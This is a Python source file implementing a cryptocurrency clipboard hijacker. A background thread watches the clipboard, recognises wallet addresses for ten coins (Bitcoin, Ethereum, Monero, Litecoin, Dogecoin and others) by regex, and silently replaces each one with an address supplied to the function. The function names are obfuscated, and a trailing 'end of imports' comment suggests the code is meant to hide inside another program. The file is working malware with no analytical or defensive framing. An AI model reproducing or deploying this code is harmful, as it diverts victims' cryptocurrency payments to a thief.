import pyperclip
import re
import os
import json
import threading

clipper_stop = True
thread = None

def s44t4r4tc1lp3r(btc: str = None, eth: str = None, xmr: str = None, ltc: str = None, doge: str = None, bch: str = None, dash: str = None, trx: str = None, xrp: str = None, xlm: str = None):
    global clipper_stop, thread
    if clipper_stop:
        clipper_stop = False
        addresses = {
            "btc": btc,
            "eth": eth,
            "xmr": xmr,
            "ltc": ltc,
            "doge": doge,
            "bch": bch,
            "dash": dash,
            "trx": trx,
            "xrp": xrp,
            "xlm": xlm
        }

        def match():
            clipboard = str(pyperclip.paste())
            btc_match = re.match("^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}|^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$", clipboard)
            eth_match = re.match("^0x[a-zA-F0-9]{40}$", clipboard)
            doge_match = re.match("^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}$", clipboard)
            ltc_match = re.match("^([LM3]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}||ltc1[a-z0-9]{39,59})$", clipboard)
            xmr_match = re.match("^[48][0-9AB][1-9A-HJ-NP-Za-km-z]{93}$", clipboard)
            bch_match = re.match("^((bitcoincash|bchreg|bchtest):)?(q|p)[a-z0-9]{41}$", clipboard)
            dash_match = re.match("^X[1-9A-HJ-NP-Za-km-z]{33}$", clipboard)
            trx_match = re.match("^T[A-Za-z1-9]{33}$", clipboard)
            xrp_match = re.match("^r[0-9a-zA-Z]{33}$", clipboard)
            xlm_match = re.match("^G[0-9A-Z]{40,60}$", clipboard)
            for currency, address in addresses.items():
                if eval(f'{currency.lower()}_match'):
                    if address and address != clipboard:
                        pyperclip.copy(address)
                    break

        def wait_for_paste():
            while not clipper_stop:
                pyperclip.waitForNewPaste()
                match()

        thread = threading.Thread(target=wait_for_paste)
        thread.start()
        return True
    else:
        return False

def st0pcl111p():
    global clipper_stop, thread
    if not clipper_stop:
        clipper_stop = True
        thread.join()
        return True
    else:
        return False

# end of imports
